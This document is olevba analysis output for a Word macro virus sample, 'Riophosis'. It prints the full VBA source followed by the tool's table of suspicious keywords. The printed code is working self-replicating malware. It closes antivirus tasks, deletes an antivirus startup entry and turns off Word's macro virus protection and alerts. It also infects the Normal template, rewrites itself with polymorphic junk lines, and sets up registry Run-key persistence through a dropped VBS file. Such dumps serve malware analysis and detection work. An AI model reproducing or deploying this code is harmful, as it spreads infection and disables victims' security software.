olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Riophosis-62e4ddb651fee8076eba554629405ac27a4f53c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Riophosis-62e4ddb651fee8076eba554629405ac27a4f53c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub DoCuMent_cLose()
For Each PrOG In Tasks
If InStr(1, UCase(PrOG.Name), Chr(78) & Chr(65) & Chr(86)) Then PrOG.Close
If InStr(1, UCase(PrOG.Name), Chr(65) & Chr(78) & Chr(84) & Chr(73) & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83)) Then PrOG.Close
Next
System.PrivateProfileString("", "hKEy_LOcAL_MAchIne\sOFtwAre\MiCRosOFT\WInDOwS\CurrEnTvErsion\run\", "NAv AGENT") = ""
BTHHTrRgcfg = 122174.617662907 Or 684237.451576531  '
With Application
NOHKjo = 712368.431593716 And 76435.6087220907  '
.DisplayAlerts = wdAlertsNone
ONnCHBL = 586217.413240314 + 739983.593530834  '
.EnableCancelKey = wdCancelDisabled
With .Options
prdcFhONT = nAQRPBedd Eqv JhhTEjQRF '
.VirusProtection = 0
QKQjc = QNkkj Xor mHAJQ '
.ConfirmConversions = 0
BfmhcIPMiHO = IFGBkcekscA And ISDARfBtKiI '
JeBnNSL = SoiPHPj Eqv RrqfHDR '
.SaveNormalPrompt = 0
End With
JoOibRjfF = 834244.311075747 Eqv 531363.790344357  '
End With
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate
jIdBJ = 894053.339973629 Xor 563240.203284502  '
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument
SOURCeFilE = Environ$("WiNdir") & "\RiOpHOsIs.SYS"
HHiSIHDdRsOQqA = jqALSIppOsDLQC + teftpdOEkDSGDq '
vBSbAckuP = Environ$("WIndIR") & "\RIoPhOsiS.VBS"
cJCflsCHFeA = 573881.886711717 Or 305555.097677171  '
With ThisDocument.VBProject.vbCompoNENtS(1).CODEModulE
VcODE = UCase(.LiNES(1, .COuntOFLINEs))
OfSIJMkCFR = SimAPSLfMH Or SEPlOqjNho '
pOlY
jERQTcpD = EgAkQGoD + lGApDsHN '
BTgFBdkkthLAs = 7975.92796003819 Or 452493.274713457  '
For COUnTER = 1 To Len(VcODE)
tBHRrihnjRkFGM = 164667.97812742 And 738947.1293993  '
AIEoKojMqQkS = 990259.014737248 Xor 200465.538307607  '
t = Mid(VcODE, COUnTER, 1)
cnGIfHsTtnTm = 226566.505363047 Or 326078.92330277  '
oNlkkhTsni = 238983.749777913 Or 116403.046076238  '
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr(Asc(t) + Int(Rnd * 2) * 32)
nndemtMnFAi = OgpjoiGGmPH Eqv SpedATQFLGe '
NEWVcODE = NEWVcODE & t
Next
lnTtrIBtDcTE = 104719.176477313 And 754792.233507335  '
FEgdn = gFRod + FsgKl '
Open SOURCeFilE For Output As #1
Print #1, NEWVcODE
PAqmpgJbLfQBS = 729437.277439892 And 284994.436417937  '
Close #1
oTjqmCtJF = gmSNkCtTF And pnrKedFsl '
Open vBSbAckuP For Output As #1
Print #1, "oN Error REsUME nExT"
llhFcm = dMGeDH Or qkomje '
Print #1, "SET fso = cREAteObJECT(""wOrD.APPLICATIOn"")"
Print #1, "wiTh fSo.OPTIons"
eogCqpetSAO = 256962.400012136 + 285123.122717321  '
Print #1, ".virUspROtecTion = 0"
Print #1, ".coNfiRmConveRSIonS = 0"
CKHcoklA = 889230.673382878 + 800425.265495718  '
Print #1, ".SAVeNoRMALprompT = 0"
Print #1, ".APplIcAtiOn.DIsPlAyAleRTs = WDALeRtsnONE"
NQoOAlbLT = 672370.715110302 And 794389.585992157  '
Print #1, "EnD wiTh"
IRjnHeoDbCIs = JPJrbhAmCAqd Xor iTSbpDoLtAQl '
Print #1, "With FsO.norMALTeMPLATE.VbPrOJeCT.VBcomponenTS(1)"
Print #1, ".CODEMoDuLE.DEletElINeS 1, .cODEMODule.CounTOFlINes"
bRPTEAKmGSSShH = fqEedohTPfrcjg Xor fFHEojCoPggQpo '
Print #1, ".cODEModuLE.AddFROMfILE """ & SOURCeFilE & """"
LEiHLKbHgS = pDFFctLGes Eqv eNkdpQdiAB '
Print #1, "eND WiTh"
NHPbIlPAIe = 519876.43706274 And 253826.543181717  '
Print #1, "FSo.noRmAlteMPlAte.SAve"
EentIpGCmD = pAsJCRbfJC - BEkJrOIcqK '
Print #1, "FSO.QuIt"
QJAMOH = RElefg - HltTHM '
Close #1
GeQpEIsebABT = 194717.331718326 - 799250.578331172  '
PAtblQtr = jTjkMQAt + cIOkNCEo '
cGEnG = Lepio Or OreRM '
sJNIIDndDmp = sEGAhmIJLQJ Xor NerkjHQJSBI '
System.PrivateProfileString("", "Hkey_loCAl_MAChIne\SOFTwARE\MicrOsoft\WINdOwS\curreNTVERsioN\Run\", "RiOphosIs") = vBSbAckuP
IPqmEmCCjeAE = 63980.6942093968 Or 220331.09089458  '
HSoDF = 529367.692391574 - 390696.850132227  '
End With
AMcDRj = 793275.516690731 - 269565.968360245  '
With Target.VBProject.vbCompoNENtS(1).CODEModulE
bmKSngmClPSfJ = OTJIrAhAAoKPe Xor fENHrmEHnSImA '
PNeGNDEpTnhES = 370822.118439138 - 261597.848600864  '
.DelEtELines 1, .COuntOFLINEs
RfRPBFLmngnfAJ = jNomtJLnMmGEBR Xor fbogOSCrMGjLSE '
.AddFromFile SOURCeFilE
CbAkepfkGnmdE = 518258.053366184 Or 273330.117122948  '
End With
qpAAIdojBC = DrHNApkHmL - QeOftfABeG '
HolpeiJJg = 575600.40611136 + 341415.123462617  '
End Sub
Private Sub pOlY()
With ThisDocument.VBProject.vbCompoNENtS(1).CODEModulE
irLNT = BSPjG - LgPLr '
For i = 1 To .COuntOFLINEs
NjRJtCRlSk = 518319.922925591 Xor 186108.462668359  '
A = Int(Rnd * 6) + 1
If A = 1 Then OpeR = Space(1) & "xOR" & Space(1)
AbTMA = SSIPA Eqv sIMEP '
If A = 2 Then OpeR = Space(1) & "ANd" & Space(1)
ThjQBeRKiCS = leiRJoRcPLh Or PArqegFdbTJ '
If A = 3 Then OpeR = Space(1) & "oR" & Space(1)
CsJSPgpb = BksMhkLd + AQNFTrdJ '
If A = 4 Then OpeR = Space(1) & "+" & Space(1)
pnNsHnmk = sgnSoPsj Xor hORPIAJn '
If A = 5 Then OpeR = Space(1) & "-" & Space(1)
If A = 6 Then OpeR = Space(1) & "eQV" & Space(1)
LOOCAtgOln = 218693.812544525 - 137661.08098197  '
A = Int(Rnd * 2) + 1
For Ii = 1 To 5 + Int(Rnd * 10)
nRLonqSjElARd = 146328.89896667 And 160236.973265827  '
JUnK1 = JUnK1 & Chr(Int(Rnd * 20) + 97)
If A = 1 Then JUNk2 = JUNk2 & Chr(Int(Rnd * 20) + 97)
JlDHkEq = 172567.671823025 Or 88722.7959321141  '
If A = 2 Then JUNk2 = Space(1) & Rnd * 999999 & Space(1)
If A = 1 Then junK3 = junK3 & Chr(Int(Rnd * 20) + 97)
JQAlnPjieHK = llGSbEbLNJQ - IIogJtOBQok '
jjBcnqg = PdOBTAH - PLNAhnR '
If A = 2 Then junK3 = Space(1) & Rnd * 999999 & Space(1)
Next
IjqRO = rrCEj + TlLkA '
If Right(.LiNES(i, 1), Len(i) - 1) = "'" Then .rEPLAcELine i, JUnK1 & "=" & JUNk2 & OpeR & junK3 & "'"
JUnK1 = ""
BjiCqntHtnefH = dfcfAkCGQqsfl - qfIIMBtIAOtts '
JUNk2 = ""
EPLillLhM = KnrokNgLc Xor noePgeltQ '
junK3 = ""
thHlhl = IPmsGS - eLKfmt '
Next
cEeFpGMJBAr = 464736.354530454 And 531917.576545179  '
End With
KmIliEeHRJb = SeoTDEebkpF + kjlnrmgKhSb '
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DoCuMent_cLose      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|cREAteObJECT        |May create an OLE object                     |
|Suspicious|WInDOwS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbCompoNENtS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEModulE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RIoPhOsiS.VBS       |Executable file name                         |
|Hex String|A2@1                |41324031                                     |
|Hex String|Cpbt                |43706274                                     |
|Hex String|iB      9h          |6942093968                                   |
|Hex String|F&h5                |46266835                                     |
|Hex String|5E0E                |35453045                                     |
+----------+--------------------+---------------------------------------------+

